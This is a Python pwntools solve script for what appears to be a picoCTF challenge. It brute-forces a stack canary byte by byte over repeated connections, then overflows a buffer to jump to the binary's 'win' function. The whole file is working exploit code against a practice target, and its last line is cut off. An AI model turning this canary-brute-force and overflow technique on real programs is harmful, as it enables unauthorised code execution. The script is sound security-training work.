#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
binary = context.binary = ELF('vuln')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" vuln
    # ln -s libc-*.so libc.so.6
    p = process(binary.path, env=env)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

# do leak / payload gen here

payload = b''
PORT = 65272
HOST = 'saturn.picoctf.net'
padsize = 64

def do_brute(payload=b'', canary_size=4):
    known_canary_bytes = []

    for x in range(canary_size):
        if x > len(known_canary_bytes):
            print("couldnt find a byte!")
            break
        for i in range(256):
            payload += bytes(known_canary_bytes) + bytes([i])
            p = new_proc() if not args.REMOTE else remote(HOST, PORT)
            p.sendafter(b'> ', str(len(payload)).encode() + b'\n')
            p.send(payload)
            b = b''
            while len(b) == 0:
                time.sleep(0.1)
                b = p.read()
            if b.find(b'*****') == -1:
                known_canary_bytes.append(i)
                print(known_canary_bytes)
                print(b)
                p.close()
                break
            p.close()

    return known_canary_bytes

padding = b'A'*padsize
chain = p32(binary.sym['win'])*1 # + p32(binary.sym['main'])
canary = do_brute(padding)

payload = padding + bytes(canary) + chain

p = new_proc() if not args.REMOTE else remote(HOST, PORT)
p.sendafter(b'> ', str(len(payload)).encode() + b'\n')
p.sendafter(b'Input> ', payload)
time.sleep(0.1)
b = p.read()
print(b)
# padsize = 64
# known_canary_bytes = []
# i = ord(b'A')
# payload = b'J'*padsize + bytes(known_canary_bytes) + bytes([i])
# p = new_proc() if not args.REMOTE else remote('localhost', 8000)
# p.sendafter(b'> ', str(len(payload)).encode() + b'\n')
# p.send(payload)

# p.interactive(
